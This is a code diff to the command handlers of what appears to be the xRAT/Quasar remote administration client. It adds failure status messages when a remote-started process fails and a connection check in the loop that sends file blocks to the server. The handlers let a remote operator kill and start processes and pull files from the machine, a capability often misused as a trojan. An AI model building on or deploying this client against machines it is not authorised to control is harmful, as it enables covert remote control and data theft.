@@ -312,7 +312,8 @@ namespace xClient.Core.Commands
                 Process.GetProcessById(command.PID).Kill();
             }
             catch
-            { }
+            {
+            }
             finally
             {
                 HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
@@ -321,19 +322,28 @@ namespace xClient.Core.Commands
 
         public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
         {
-            if (!string.IsNullOrEmpty(command.Processname))
+            if (string.IsNullOrEmpty(command.Processname))
             {
-                try
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+                return;
+            }
+
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
                 {
-                    ProcessStartInfo startInfo = new ProcessStartInfo { UseShellExecute = true, FileName = command.Processname };
-                    Process.Start(startInfo);
-                }
-                catch
-                { }
-                finally
-                {
-                    HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
-                }
+                    UseShellExecute = true,
+                    FileName = command.Processname
+                };
+                Process.Start(startInfo);
+            }
+            catch
+            {
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+            }
+            finally
+            {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
             }
         }
 
@@ -451,6 +461,7 @@ namespace xClient.Core.Commands
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
+                        if (!client.Connected) return;
                         if (_canceledDownloads.ContainsKey(command.ID)) return;
 
                         byte[] block;
